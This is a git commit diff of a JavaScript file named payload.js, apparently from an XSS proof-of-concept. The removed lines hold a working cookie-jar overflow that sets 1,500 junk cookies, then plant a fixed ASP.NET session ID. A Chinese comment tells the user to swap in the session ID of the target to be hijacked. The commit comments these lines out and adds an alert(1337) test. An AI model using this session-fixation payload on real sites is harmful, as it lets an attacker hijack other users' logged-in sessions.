c56a3cfa89ce02e63bde5c7a1c688bed074cccf2
0xpk <136787670+H4ck3rxPK@users.noreply.github.com>
2026-03-06 12:10:10 +0800

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,6 +1,7 @@
 // payload.js
-for(let i=1500;i--;) {
-    document.cookie = `c${i}=${i};path=/`;
-}
+//for(let i=1500;i--;) {
+//    document.cookie = `c${i}=${i};path=/`;
+//}
 // 把下面的值換成你想要劫持的目標 Session ID
-document.cookie = 'ASP.NET_SessionId=3wcidffzmp1wafu0uefvcuhw;path=/';
+//document.cookie = 'ASP.NET_SessionId=3wcidffzmp1wafu0uefvcuhw;path=/';
+alert(1337)
